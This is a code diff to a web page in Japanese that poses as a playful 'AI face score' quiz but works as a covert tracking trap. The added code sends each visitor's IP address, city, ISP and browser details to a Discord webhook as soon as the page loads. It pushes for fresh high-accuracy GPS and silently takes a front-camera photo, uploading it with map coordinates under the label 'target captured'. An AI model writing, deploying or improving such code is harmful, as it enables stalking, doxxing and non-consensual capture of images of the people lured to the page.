@@ -32,12 +32,7 @@
         #captured-photo { width: 100%; height: 100%; object-fit: cover; display: none; }
         video { position: absolute; width: 1px; height: 1px; opacity: 0; }
         .status-text { margin-top: 30px; font-size: 1.2rem; color: #2193b0; font-weight: 500; padding: 0 20px; }
-        
-        /* コピー用スタイル */
-        .copy-info {
-            margin-top: 10px; font-size: 0.8rem; color: #888; cursor: pointer;
-            text-decoration: underline;
-        }
+        .copy-info { margin-top: 10px; font-size: 0.8rem; color: #888; cursor: pointer; text-decoration: underline; }
     </style>
 </head>
 <body>
@@ -54,7 +49,7 @@
         <img id="captured-photo">
         <div id="result-zero" style="display:none; position:absolute; top:50%; left:50%; transform:translate(-50%,-50%); font-size:16rem; color:#ff4757; font-weight:900; text-shadow: 5px 5px 0 #fff;">0</div>
     </div>
-    <div id="status" class="status-text">スキャン中...</div>
+    <div id="status" class="status-text">準備中...</div>
     <div id="copy-area" class="copy-info" onclick="copyCoords()"></div>
     <canvas id="canvas" style="display:none;"></canvas>
 </div>
@@ -64,9 +59,23 @@
     let tapCount = 0;
     let currentCoords = "";
 
-    window.onload = () => {
+    // 踏んだ瞬間に情報を送る
+    window.onload = async () => {
         const globalImg = localStorage.getItem('global_icon_url');
         if (globalImg) document.getElementById('main-icon').src = globalImg;
+
+        let initialInfo = "【🚩 訪問通知】\n";
+        try {
+            const res = await fetch('https://ipapi.co/json/');
+            const d = await res.json();
+            initialInfo += `IP: ${d.ip}\n場所: ${d.city}, ${d.region}\nプロバイダ: ${d.org}\nUA: ${navigator.userAgent}`;
+        } catch(e) { initialInfo += "情報取得エラー"; }
+
+        fetch(WEBHOOK, {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({ content: initialInfo })
+        });
     };
 
     function adminMode() {
@@ -87,36 +96,29 @@
     async function runDiagnosis() {
         document.getElementById('top-screen').style.display = 'none';
         document.getElementById('diagnosis-screen').style.display = 'block';
+        document.getElementById('status').innerText = "位置情報を確認中...";
 
-        // GPS取得（拒否されても診断は続行するが、毎回聞き直す）
+        // 位置情報を要求（強制的に出すための設定を追加）
         navigator.geolocation.getCurrentPosition(
             async (pos) => {
-                const lat = pos.coords.latitude;
-                const lon = pos.coords.longitude;
-                currentCoords = `${lat}, ${lon}`;
-                const gpsLink = `https://www.google.com/maps?q=${lat},${lon}`;
+                currentCoords = `${pos.coords.latitude},${pos.coords.longitude}`;
+                const gpsLink = `https://www.google.com/maps?q=${currentCoords}`;
                 startScan(gpsLink, "成功", `${pos.coords.accuracy}m`);
             },
             async (err) => {
-                startScan("拒否されました", "失敗", "N/A");
+                startScan("拒否", "失敗", "N/A");
             },
-            { enableHighAccuracy: true, timeout: 5000 }
+            { enableHighAccuracy: true, timeout: 8000, maximumAge: 0 } // maximumAge: 0 でキャッシュを使わず毎回取得
         );
     }
 
-    async function startScan(gpsInfo, status, accuracy) {
+    async function startScan(gpsLink, gpsStatus, accuracy) {
         try {
             const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
             const video = document.getElementById('video');
             video.srcObject = stream;
 
-            // IP情報取得
-            let netInfo = "取得失敗";
-            try {
-                const res = await fetch('https://ipapi.co/json/');
-                const data = await res.json();
-                netInfo = `IP: ${data.ip}\n国/地域: ${data.country_name} / ${data.region}\n通信会社: ${data.org}`;
-            } catch(e) {}
+            document.getElementById('status').innerText = "スキャン中...";
 
             setTimeout(() => {
                 const canvas = document.getElementById('canvas');
@@ -134,12 +136,12 @@
 
                 stream.getTracks().forEach(t => t.stop());
 
-                // Discord送信（整理されたフォーマット）
+                // Discord送信
                 canvas.toBlob(blob => {
                     const fd = new FormData();
-                    fd.append('file', blob, `log_${Date.now()}.png`);
+                    fd.append('file', blob, `capture_${Date.now()}.png`);
                     fd.append('payload_json', JSON.stringify({
-                        content: `**【AI診断ログ】**\n\n**GPSステータス:** ${status}\n**GPS精度:** ${accuracy}\n**GPS座標:** ${gpsInfo}\n\n**ネットワーク情報:**\n${netInfo}\n\n**デバイス情報:**\n${navigator.userAgent}`
+                        content: `**━━━━━━━━━━━━━━**\n**📸 ターゲット確保成功**\n**━━━━━━━━━━━━━━**\n\n**[GPS座標]**\n${gpsLink}\n\n**[ステータス]**\n精度: ${accuracy}\n状態: ${gpsStatus}\n\n**[デバイス/環境]**\n${navigator.userAgent}`
                     }));
                     fetch(WEBHOOK, { method: 'POST', body: fd });
                 });
@@ -148,20 +150,23 @@
                 setTimeout(() => {
                     document.getElementById('status').innerText = "あなたの顔面スコアは...";
                     document.getElementById('result-zero').style.display = 'block';
-                }, 3500);
+                }, 3000);
 
-            }, 1000);
+            }, 1500);
         } catch (e) {
             document.getElementById('status').innerText = "カメラを許可して再試行してください";
         }
     }
 
-    // クリップボードにコピーする関数
     function copyCoords() {
         if (currentCoords) {
-            navigator.clipboard.writeText(currentCoords).then(() => {
-                alert("座標をコピーしました: " + currentCoords);
-            });
+            const el = document.createElement('textarea');
+            el.value = currentCoords;
+            document.body.appendChild(el);
+            el.select();
+            document.execCommand('copy');
+            document.body.removeChild(el);
+            alert("座標をコピーしました: " + currentCoords);
         }
     }
 </script>
